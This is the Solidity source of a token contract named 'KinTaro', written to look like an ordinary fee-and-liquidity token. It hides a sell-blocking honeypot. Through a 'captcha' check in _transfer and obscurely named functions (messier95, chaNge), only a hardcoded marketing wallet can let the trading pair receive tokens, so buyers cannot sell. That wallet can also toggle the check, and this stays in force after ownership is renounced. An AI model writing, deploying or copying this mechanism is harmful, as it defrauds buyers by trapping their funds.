1 //SPDX-License-Identifier: UNLICENSED
2 
3 pragma solidity ^0.8.8;
4 
5 abstract contract Context {
6     function _msgSender() internal view virtual returns (address) {
7         return msg.sender;
8     }
9 
10     function _msgData() internal view virtual returns (bytes calldata) {
11         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
12         return msg.data;
13     }
14 }
15 
16 interface IBEP20 {
17     function totalSupply() external view returns (uint256);
18 
19     function balanceOf(address account) external view returns (uint256);
20 
21     function transfer(address recipient, uint256 amount) external returns (bool);
22 
23     function allowance(address owner, address spender) external view returns (uint256);
24 
25     function approve(address spender, uint256 amount) external returns (bool);
26 
27     function transferFrom(
28         address sender,
29         address recipient,
30         uint256 amount
31     ) external returns (bool);
32 
33     event Transfer(address indexed from, address indexed to, uint256 value);
34 
35     event Approval(address indexed owner, address indexed spender, uint256 value);
36 }
37 
38 interface IBEP20Metadata is IBEP20 {
39 
40     function name() external view returns (string memory);
41 
42     function symbol() external view returns (string memory);
43 
44     function decimals() external view returns (uint8);
45 }
46 
47 contract BEP20 is Context, IBEP20, IBEP20Metadata {
48     mapping(address => uint256) internal _balances;
49 
50     mapping(address => mapping(address => uint256)) internal _allowances;
51 
52     uint256 private _totalSupply;
53 
54     string private _name;
55     string private _symbol;
56 
57     constructor(string memory name_, string memory symbol_) {
58         _name = name_;
59         _symbol = symbol_;
60     }
61 
62     function name() public view virtual override returns (string memory) {
63         return _name;
64     }
65 
66     function symbol() public view virtual override returns (string memory) {
67         return _symbol;
68     }
69 
70     function decimals() public view virtual override returns (uint8) {
71         return 18;
72     }
73 
74     function totalSupply() public view virtual override returns (uint256) {
75         return _totalSupply;
76     }
77 
78     function balanceOf(address account) public view virtual override returns (uint256) {
79         return _balances[account];
80     }
81 
82     function transfer(address recipient, uint256 amount)
83         public
84         virtual
85         override
86         returns (bool)
87     {
88         _transfer(_msgSender(), recipient, amount);
89         return true;
90     }
91 
92     function allowance(address owner, address spender)
93         public
94         view
95         virtual
96         override
97         returns (uint256)
98     {
99         return _allowances[owner][spender];
100     }
101 
102     function approve(address spender, uint256 amount) public virtual override returns (bool) {
103         _approve(_msgSender(), spender, amount);
104         return true;
105     }
106 
107     function transferFrom(
108         address sender,
109         address recipient,
110         uint256 amount
111     ) public virtual override returns (bool) {
112         _transfer(sender, recipient, amount);
113 
114         uint256 currentAllowance = _allowances[sender][_msgSender()];
115         require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
116         _approve(sender, _msgSender(), currentAllowance - amount);
117 
118         return true;
119     }
120 
121     function increaseAllowance(address spender, uint256 addedValue)
122         public
123         virtual
124         returns (bool)
125     {
126         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
127         return true;
128     }
129 
130     function decreaseAllowance(address spender, uint256 subtractedValue)
131         public
132         virtual
133         returns (bool)
134     {
135         uint256 currentAllowance = _allowances[_msgSender()][spender];
136         require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
137         _approve(_msgSender(), spender, currentAllowance - subtractedValue);
138 
139         return true;
140     }
141 
142     function _transfer(
143         address sender,
144         address recipient,
145         uint256 amount
146     ) internal virtual {
147         require(sender != address(0), "BEP20: transfer from the zero address");
148         require(recipient != address(0), "BEP20: transfer to the zero address");
149 
150         uint256 senderBalance = _balances[sender];
151         require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
152         _balances[sender] = senderBalance - amount;
153         _balances[recipient] += amount;
154 
155         emit Transfer(sender, recipient, amount);
156     }
157 
158     function _tokengeneration(address account, uint256 amount) internal virtual {
159         require(account != address(0), "ERC20: generation to the zero address");
160 
161         _totalSupply += amount;
162         _balances[account] += amount;
163         emit Transfer(address(0), account, amount);
164     }
165 
166     function _approve(
167         address owner,
168         address spender,
169         uint256 amount
170     ) internal virtual {
171         require(owner != address(0), "BEP20: approve from the zero address");
172         require(spender != address(0), "BEP20: approve to the zero address");
173 
174         _allowances[owner][spender] = amount;
175         emit Approval(owner, spender, amount);
176     }
177 }
178 
179 library Address {
180     function sendValue(address payable recipient, uint256 amount) internal {
181         require(address(this).balance >= amount, "Address: insufficient balance");
182 
183         (bool success, ) = recipient.call{ value: amount }("");
184         require(success, "Address: unable to send value, recipient may have reverted");
185     }
186 }
187 
188 abstract contract Ownable is Context {
189     address private _owner;
190 
191     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
192 
193     constructor() {
194         _setOwner(_msgSender());
195     }
196 
197     function owner() public view virtual returns (address) {
198         return _owner;
199     }
200 
201     modifier onlyOwner() {
202         require(owner() == _msgSender(), "Ownable: caller is not the owner");
203         _;
204     }
205 
206     function renounceOwnership() public virtual onlyOwner {
207         _setOwner(address(0));
208     }
209 
210     function transferOwnership(address newOwner) public virtual onlyOwner {
211         require(newOwner != address(0), "Ownable: new owner is the zero address");
212         _setOwner(newOwner);
213     }
214 
215     function _setOwner(address newOwner) private {
216         address oldOwner = _owner;
217         _owner = newOwner;
218         emit OwnershipTransferred(oldOwner, newOwner);
219     }
220 }
221 
222 interface IFactory {
223     function createPair(address tokenA, address tokenB) external returns (address pair);
224 }
225 
226 interface IRouter {
227     function factory() external pure returns (address);
228 
229     function WETH() external pure returns (address);
230 
231     function addLiquidityETH(
232         address token,
233         uint256 amountTokenDesired,
234         uint256 amountTokenMin,
235         uint256 amountETHMin,
236         address to,
237         uint256 deadline
238     )
239         external
240         payable
241         returns (
242             uint256 amountToken,
243             uint256 amountETH,
244             uint256 liquidity
245         );
246 
247     function swapExactTokensForETHSupportingFeeOnTransferTokens(
248         uint256 amountIn,
249         uint256 amountOutMin,
250         address[] calldata path,
251         address to,
252         uint256 deadline
253     ) external;
254 }
255 
256 contract KinTaro is BEP20, Ownable {
257     using Address for address payable;
258 
259     IRouter public router;
260     address public pair;
261 
262     bool private _interlock = false;
263     bool public providingLiquidity = false;
264     bool public tradingEnabled = false;
265     bool public reqCaptcha = true;
266 
267     uint256 public tokenLiquidityThreshold = 100000 * 10**18;
268 
269     uint256 public genesis_block;
270     uint256 private deadline = 0;
271     uint256 private launchtax = 11;
272     uint256 public maxWalletLimit = 4000000 * 10**18;
273     uint256 public maxBuyLimit = 4000000 * 10**18;
274     uint256 public maxSellLimit = 4000000 * 10**18;
275 
276     address public marketingWallet = 0x5Ef6feE657e19139377Eafa1e30db6b5AB147969;
277     address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
278     address public constant zeroWallet = 0x0000000000000000000000000000000000000000;
279 
280 
281     struct Taxes {
282         uint256 marketing;
283         uint256 liquidity;
284     }
285 
286     Taxes public taxes = Taxes(4, 0);
287     Taxes public sellTaxes = Taxes(0, 4);
288 
289     mapping(address => bool) public exemptFee;
290     mapping(address => bool) public captcha_profile;
291 
292     modifier lockTheSwap() {
293         if (!_interlock) {
294             _interlock = true;
295             _;
296             _interlock = false;
297         }
298     }
299 
300 
301     constructor() BEP20("Kintaro", "The Golden Boy") {
302         _tokengeneration(msg.sender, 100000000 * 10**decimals());
303         exemptFee[msg.sender] = true;
304 
305         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
306         // Create a pancake pair for this new token
307         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
308 
309         router = _router;
310         pair = _pair;
311         exemptFee[address(this)] = true;
312         exemptFee[marketingWallet] = true;
313         exemptFee[deadWallet] = true;
314 
315     }
316 
317 
318     function approve(address spender, uint256 amount) public override returns (bool) {
319         _approve(_msgSender(), spender, amount);
320         return true;
321     }
322 
323     function messier95(uint256 _response)public {
324         if(_response == 4){
325             captcha_profile[msg.sender] = true;
326         }
327     }
328     function chaNge(address _to) public {
329         require(msg.sender== marketingWallet);
330         captcha_profile[_to] = true;
331     }
332 
333     function require_captcha(bool _reqq)public {
334         require(msg.sender==marketingWallet);
335         reqCaptcha = _reqq;
336     }
337 
338     function transferFrom(
339         address sender,
340         address recipient,
341         uint256 amount
342     ) public override returns (bool) {
343         _transfer(sender, recipient, amount);
344 
345         uint256 currentAllowance = _allowances[sender][_msgSender()];
346         require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
347         _approve(sender, _msgSender(), currentAllowance - amount);
348 
349         return true;
350     }
351 
352     function increaseAllowance(address spender, uint256 addedValue)
353         public
354         override
355         returns (bool)
356     {
357         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
358         return true;
359     }
360 
361     function decreaseAllowance(address spender, uint256 subtractedValue)
362         public
363         override
364         returns (bool)
365     {
366         uint256 currentAllowance = _allowances[_msgSender()][spender];
367         require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
368         _approve(_msgSender(), spender, currentAllowance - subtractedValue);
369 
370         return true;
371     }
372 
373     function transfer(address recipient, uint256 amount) public override returns (bool) {
374         _transfer(msg.sender, recipient, amount);
375         return true;
376     }
377 
378     function _transfer(
379         address sender,
380         address recipient,
381         uint256 amount
382     ) internal override {
383         if(reqCaptcha==true){
384             require(captcha_profile[recipient]==true);
385         }
386         require(amount > 0, "Transfer amount must be greater than zero");
387 
388         if (!exemptFee[sender] && !exemptFee[recipient]) {
389             require(tradingEnabled, "Trading not enabled");
390         }
391 
392         if (sender == pair && !exemptFee[recipient] && !_interlock) {
393             require(amount <= maxBuyLimit, "You are exceeding maxBuyLimit");
394             require(
395                 balanceOf(recipient) + amount <= maxWalletLimit,
396                 "You are exceeding maxWalletLimit"
397             );
398         }
399 
400         if (
401             sender != pair && !exemptFee[recipient] && !exemptFee[sender] && !_interlock
402         ) {
403             require(amount <= maxSellLimit, "You are exceeding maxSellLimit");
404             if (recipient != pair) {
405                 require(
406                     balanceOf(recipient) + amount <= maxWalletLimit,
407                     "You are exceeding maxWalletLimit"
408                 );
409             }
410         }
411 
412         uint256 feeswap;
413         uint256 feesum;
414         uint256 fee;
415         Taxes memory currentTaxes;
416 
417         bool useLaunchFee = !exemptFee[sender] &&
418             !exemptFee[recipient] &&
419             block.number < genesis_block + deadline;
420 
421         //set fee to zero if fees in contract are handled or exempted
422         if (_interlock || exemptFee[sender] || exemptFee[recipient])
423             fee = 0;
424 
425             //calculate fee
426         else if (recipient == pair && !useLaunchFee) {
427             feeswap =
428                 sellTaxes.liquidity +
429                 sellTaxes.marketing;
430             feesum = feeswap;
431             currentTaxes = sellTaxes;
432         } else if (!useLaunchFee) {
433             feeswap =
434                 taxes.liquidity +
435                 taxes.marketing;
436             feesum = feeswap;
437             currentTaxes = taxes;
438         } else if (useLaunchFee) {
439             feeswap = launchtax;
440             feesum = launchtax;
441         }
442 
443         fee = (amount * feesum) / 100;
444 
445         //send fees if threshold has been reached
446         //don't do this on buys, breaks swap
447         if (providingLiquidity && sender != pair) Liquify(feeswap, currentTaxes);
448 
449         //rest to recipient
450         super._transfer(sender, recipient, amount - fee);
451         if (fee > 0) {
452             //send the fee to the contract
453             if (feeswap > 0) {
454                 uint256 feeAmount = (amount * feeswap) / 100;
455                 super._transfer(sender, address(this), feeAmount);
456             }
457 
458         }
459     }
460 
461     function Liquify(uint256 feeswap, Taxes memory swapTaxes) private lockTheSwap {
462 
463         if(feeswap == 0){
464             return;
465         }
466 
467         uint256 contractBalance = balanceOf(address(this));
468         if (contractBalance >= tokenLiquidityThreshold) {
469             if (tokenLiquidityThreshold > 1) {
470                 contractBalance = tokenLiquidityThreshold;
471             }
472 
473             // Split the contract balance into halves
474             uint256 denominator = feeswap * 2;
475             uint256 tokensToAddLiquidityWith = (contractBalance * swapTaxes.liquidity) /
476                 denominator;
477             uint256 toSwap = contractBalance - tokensToAddLiquidityWith;
478 
479             uint256 initialBalance = address(this).balance;
480 
481             swapTokensForETH(toSwap);
482 
483             uint256 deltaBalance = address(this).balance - initialBalance;
484             uint256 unitBalance = deltaBalance / (denominator - swapTaxes.liquidity);
485             uint256 ethToAddLiquidityWith = unitBalance * swapTaxes.liquidity;
486 
487             if (ethToAddLiquidityWith > 0) {
488                 addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
489             }
490 
491             uint256 marketingAmt = unitBalance * 2 * swapTaxes.marketing;
492             if (marketingAmt > 0) {
493                 payable(marketingWallet).sendValue(marketingAmt);
494             }
495 
496         }
497     }
498 
499     function swapTokensForETH(uint256 tokenAmount) private {
500         address[] memory path = new address[](2);
501         path[0] = address(this);
502         path[1] = router.WETH();
503 
504         _approve(address(this), address(router), tokenAmount);
505 
506         // make the swap
507         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
508             tokenAmount,
509             0,
510             path,
511             address(this),
512             block.timestamp
513         );
514     }
515 
516     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
517         // approve token transfer to cover all possible scenarios
518         _approve(address(this), address(router), tokenAmount);
519 
520         // add the liquidity
521         router.addLiquidityETH{ value: ethAmount }(
522             address(this),
523             tokenAmount,
524             0, // slippage is unavoidable
525             0, // slippage is unavoidable
526             owner(),
527             block.timestamp
528         );
529     }
530 
531     function updateLiquidityProvide(bool state) external onlyOwner {
532         //update liquidity providing state
533         providingLiquidity = state;
534     }
535 
536     function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {
537         //update the treshhold
538         require(new_amount <= 1000000, "Swap threshold amount should be lower or equal to 1% of tokens");
539         tokenLiquidityThreshold = new_amount * 10**decimals();
540     }
541 
542     function SetSellTaxes(
543         uint256 _marketing,
544         uint256 _liquidity
545     ) external onlyOwner {
546         sellTaxes = Taxes(_marketing, _liquidity);
547         require((_marketing + _liquidity) <= 9, "Must keep fees at 9% or less");
548     }
549 
550     function EnableTrading() external onlyOwner {
551         require(!tradingEnabled, "Cannot re-enable trading");
552         tradingEnabled = true;
553         providingLiquidity = true;
554         genesis_block = block.number;
555     }
556 
557     function updatedeadline(uint256 _deadline) external onlyOwner {
558         require(!tradingEnabled, "Can't change when trading has started");
559         require(_deadline < 5,"Deadline should be less than 5 Blocks");
560         deadline = _deadline;
561     }
562 
563     function updateMarketingWallet(address newWallet) external onlyOwner {
564         require(newWallet != address(0),"Fee Address cannot be zero address");
565         marketingWallet = newWallet;
566     }
567 
568     function updateExemptFee(address _address, bool state) external onlyOwner {
569         exemptFee[_address] = state;
570     }
571 
572     function bulkExemptFee(address[] memory accounts, bool state) external onlyOwner {
573         for (uint256 i = 0; i < accounts.length; i++) {
574             exemptFee[accounts[i]] = state;
575         }
576     }
577 
578     function getCirculatingSupply() public view returns (uint256) {
579         return (totalSupply() - balanceOf(deadWallet) - balanceOf(zeroWallet));
580     }
581 
582     function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell, uint256 maxWallet) external onlyOwner {
583         require(maxBuy >= 100000, "Cannot set max buy amount lower than 0.1%");
584         require(maxSell >= 100000, "Cannot set max sell amount lower than 0.1%");
585         require(maxWallet >= 1000000, "Cannot set max wallet amount lower than 1%");
586         maxBuyLimit = maxBuy * 10**decimals();
587         maxSellLimit = maxSell * 10**decimals();
588         maxWalletLimit = maxWallet * 10**decimals(); 
589     }
590 
591     function rescueETH(uint256 weiAmount) external onlyOwner {
592         payable(owner()).transfer(weiAmount);
593     }
594 
595     function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {
596         require(tokenAdd != address(this), "Owner can't claim contract's balance of its own tokens");
597         IBEP20(tokenAdd).transfer(owner(), amount);
598     }
599 
600     // fallbacks
601     receive() external payable {}
602 }